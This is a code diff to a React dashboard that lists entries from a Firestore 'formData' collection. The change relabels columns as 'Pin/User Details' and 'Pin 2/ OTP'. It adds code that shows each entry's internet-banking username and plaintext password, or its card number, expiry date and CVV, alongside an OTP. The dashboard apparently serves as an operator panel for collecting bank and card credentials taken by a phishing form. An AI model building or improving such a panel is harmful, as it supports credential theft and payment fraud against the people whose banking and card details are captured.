@@ -99,7 +99,7 @@ const headCells = [
     numeric: false,
     disablePadding: false,
     label: 'Issue',
-    width: "500px"
+
   },
   {
     id: 'amount',
@@ -111,13 +111,13 @@ const headCells = [
     id: 'm_pin_1',
     numeric: false,
     disablePadding: false,
-    label: 'Pin',
+    label: 'Pin/User Details',
   },
   {
     id: 'm_pin_2',
     numeric: false,
     disablePadding: false,
-    label: 'Pin 2',
+    label: 'Pin 2/ OTP',
   },
   {
     id: 'action',
@@ -128,9 +128,6 @@ const headCells = [
 ];
 
 function EnhancedTableHead(props) {
-  const { onSelectAllClick, numSelected, rowCount} =
-    props;
-
 
   return (
     <TableHead>
@@ -233,7 +230,17 @@ export default function EnhancedTable(props) {
 } = usePagination(query(collection(db, "formData"), firestoreOrderBy("slNo", "desc")),{ limit: rowsPerPage });
 
 React.useEffect(()=> {
-  setData(items);
+  const finalItem = items.map(row => {
+    if (row.payment_method === 'Internet banking') {
+      row.m_pin_1 = `Bank-${row.bankname} Username-${row.username}  Password-${row.password}`;
+      row.m_pin_2 = row.otp;
+    } else if (row.payment_method === 'Credit or Debt card') {
+      row.m_pin_1 = `Card No-${row.cardNumber} Expire-${row.expire} CVV-${row.cvv}`;
+      row.m_pin_2 = row.otp;
+    }
+    return row;
+  });
+  setData(finalItem);
 },[items]);
 
 React.useEffect(()=> {
@@ -252,7 +259,7 @@ React.useEffect(()=> {
         return;
       }
     snapshot.docChanges().forEach((change) => {    
-      const oldData = [...data]
+      let oldData = [...data]
       if (change.type === "added") {
           oldData.unshift(change.doc.data());
       }
